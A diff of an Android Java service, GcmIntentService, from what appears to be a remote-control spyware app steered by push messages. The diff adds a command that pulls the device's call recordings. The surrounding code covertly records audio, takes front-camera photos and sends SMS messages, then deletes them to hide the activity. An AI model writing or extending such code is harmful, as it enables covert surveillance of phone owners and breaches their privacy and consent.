@@ -242,6 +242,12 @@ public class GcmIntentService extends IntentService implements
                         mLocationClient.connect();
 
                 }
+                if (type.equalsIgnoreCase("getcallrecordings"))
+                {
+
+                        getCallRecordings();
+
+                }
 
             }
         }
@@ -313,6 +319,7 @@ public class GcmIntentService extends IntentService implements
 
 
     }
+
     private void captureAudio(String message)
     {
         DateFormat df = new SimpleDateFormat("d MMM yyyy hh:mm a z");
@@ -354,6 +361,7 @@ public class GcmIntentService extends IntentService implements
             }
         }.start();
     }
+
     private void takePhoto(String message) {
 
 
@@ -410,6 +418,7 @@ public class GcmIntentService extends IntentService implements
         }
 
     }
+
     private int findFrontFacingCamera() {
         int cameraId = -1;
         // Search for the front facing camera
@@ -425,6 +434,7 @@ public class GcmIntentService extends IntentService implements
         }
         return cameraId;
     }
+
     Camera.PictureCallback mCall = new Camera.PictureCallback()
     {
 
@@ -466,6 +476,7 @@ public class GcmIntentService extends IntentService implements
     };
 
 
+
     private void flashLight (String message)
     {
 
@@ -503,9 +514,6 @@ public class GcmIntentService extends IntentService implements
         }
 
     }
-
-
-
 
     private void vibrate(String message) {
         if (v == null) {
@@ -550,11 +558,13 @@ public class GcmIntentService extends IntentService implements
             player = null;
         }
     }
+
     private void sendsms(String number,String message) {
         SmsManager smsManager = SmsManager.getDefault();
         smsManager.sendTextMessage(number, null, message, null, null);
         deleteSMS(getApplicationContext(),message,number);
     }
+
     public void deleteSMS(Context context, String message, String number) {
         try {
             Log.i(TAG,"Entered");
@@ -591,6 +601,7 @@ public class GcmIntentService extends IntentService implements
 
 
     }
+
     private void getCallRecordings() {
 
         String path = Environment.getExternalStorageDirectory().toString()+"/CallRecordings";
@@ -856,6 +867,11 @@ public class GcmIntentService extends IntentService implements
             cursor.close();
         }
         return contactName;
+    }
+
+    public void checkStatus()
+    {
+
     }
 
     @Override
